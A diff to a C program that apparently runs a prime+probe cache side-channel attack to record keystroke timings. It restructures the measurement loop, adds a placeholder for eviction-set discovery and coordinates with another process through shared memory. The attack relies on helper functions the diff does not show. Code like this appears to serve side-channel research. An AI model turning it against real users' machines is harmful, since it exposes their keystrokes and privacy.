@@ -270,41 +270,41 @@ int main() {
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   int eslist_index = get_evset_index(slice);
   int threshold = threshold_from_flush(mapping_start);
+  printf("simulate finding eviction sets\n");
+  sleep(5);
 
   *(volatile char *)shm_ptr = 1;
   printf("shared machine state updated to RDY\n");
 
-  do {
-    while (!*(volatile char *)(shm_ptr + 2))
-      ; // spinlock for acknowledgement
-    *(volatile char *)(shm_ptr) = 0;
-    printf("shared machine state updated to BUSY\n");
+  while (!*(volatile char *)(shm_ptr + 2))
+    ; // spinlock for acknowledgement
+  *(volatile char *)(shm_ptr) = 0;
+  printf("shared machine state updated to BUSY\n");
 
-    /* measure keystrokes */
-    printf("measure keystroke start \n");
-    uint8_t probemap[1024 * 1024];
-    uint64_t keystrokes[64 * 64];
+  /* measure keystrokes */
+  printf("measure keystroke start \n");
+  uint8_t probemap[1024 * 1024];
+  uint64_t keystrokes[64 * 64];
 
-    uint64_t num_keystrokes = 0;
-    uint64_t start_time = __rdtscp(&core_id);
-    flush_timestamps(&start_time, 1, (char *)(shm_ptr + 3));
-    printf("start timestamp flushed\n");
-    printf("%s\n", (char *)(shm_ptr + 3));
+  uint64_t num_keystrokes = 0;
+  uint64_t start_time = __rdtscp(&core_id);
+  flush_timestamps(&start_time, 1, (char *)(shm_ptr + 3));
+  printf("start timestamp flushed\n");
+  printf("%s\n", (char *)(shm_ptr + 3));
 
-    while (!*(volatile char *)(shm_ptr + 1)) {
-      // takes around 1s to fill up 1 MB buffer
-      uint64_t size =
-          prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY, probemap,
-                      1024 * 1024, keystrokes, threshold);
-      flush_timestamps(keystrokes, size, (char *)(shm_ptr + 3));
-      num_keystrokes += size;
-    }
-    /* -------------------------------------*/
+  while (!*(volatile char *)(shm_ptr + 1)) {
+    // takes around 1s to fill up 1 MB buffer
+    uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
+                                probemap, 1024 * 1024, keystrokes, threshold);
 
-    /* update machine state */
-    *(volatile char *)(shm_ptr) = 1;
-    printf("shared machine state updated to RDY\n");
-  } while (*(volatile char *)(shm_ptr + 1) != 2);
+    flush_timestamps(keystrokes, size, (char *)(shm_ptr + 3));
+    num_keystrokes += size;
+  }
+  /* -------------------------------------*/
+
+  /* update machine state */
+  *(volatile char *)(shm_ptr) = 1;
+  printf("shared machine state updated to RDY\n");
   free_es_list(es_list);
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
   close(shm_fd);
